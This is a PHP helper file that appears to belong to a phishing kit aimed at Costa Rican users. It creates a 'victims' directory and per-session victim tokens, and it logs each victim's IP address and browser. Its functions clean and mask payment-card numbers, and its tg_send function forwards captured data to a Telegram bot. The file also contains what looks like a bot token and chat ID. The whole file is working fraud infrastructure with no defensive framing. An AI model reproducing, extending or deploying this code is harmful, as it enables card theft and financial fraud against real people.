<?php
declare(strict_types=1);
require_once __DIR__ . '/config.php';

function kit_init(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_name(SESSION_NAME);
        session_start();
    }
    if (!is_dir(DATA_DIR)) {
        @mkdir(DATA_DIR, 0755, true);
    }
    if (!is_dir(VICTIMS_DIR)) {
        @mkdir(VICTIMS_DIR, 0755, true);
    }
}

function client_ip(): string
{
    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', (string)$_SERVER[$h])[0]);
            break;
        }
    }
    return $ip;
}

function h($s): string
{
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function clean_card($v): string
{
    return preg_replace('/[^0-9]/', '', (string)$v);
}

function mask_card($v): string
{
    $c = clean_card($v);
    if (strlen($c) >= 8) {
        return substr($c, 0, 4) . ' **** **** ' . substr($c, -4);
    }
    return $c === '' ? '' : '****';
}

function token_file(string $token): string
{
    return VICTIMS_DIR . '/' . preg_replace('/[^A-Za-z0-9_-]/', '', $token) . '.jsonl';
}

function log_event(string $token, string $event, array $extra = []): array
{
    $data = array_merge([
        'ts'    => date('c'),
        'ip'    => client_ip(),
        'ua'    => isset($_SERVER['HTTP_USER_AGENT']) ? substr((string)$_SERVER['HTTP_USER_AGENT'], 0, 300) : '',
        'event' => $event,
    ], $extra);
    @file_put_contents(token_file($token), json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES) . "\n", FILE_APPEND);
    return $data;
}

function tg_send(string $text): bool
{
    if (TG_BOT_TOKEN === '8524933284:AAHXn2qM3XHXqH5C18U9PENrSH7GcPnCIa0' || TG_CHAT_ID === '-5044577171') {
        return false;
    }
    $ch = curl_init('https://api.telegram.org/bot' . TG_BOT_TOKEN . '/sendMessage');
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query(['chat_id' => TG_CHAT_ID, 'text' => $text]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 8,
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    return $r !== false;
}

function ensure_flow(): string
{
    if (empty($_SESSION['victim_token'])) {
        $_SESSION['victim_token'] = bin2hex(random_bytes(16));
        log_event($_SESSION['victim_token'], 'start');
    }
    return (string)$_SESSION['victim_token'];
}

function card_session(): array
{
    return is_array($_SESSION['card'] ?? null) ? $_SESSION['card'] : [];
}

function provinces(): array
{
    return ['San José', 'Alajuela', 'Cartago', 'Heredia', 'Puntarenas', 'Guanacaste', 'Limón'];
}
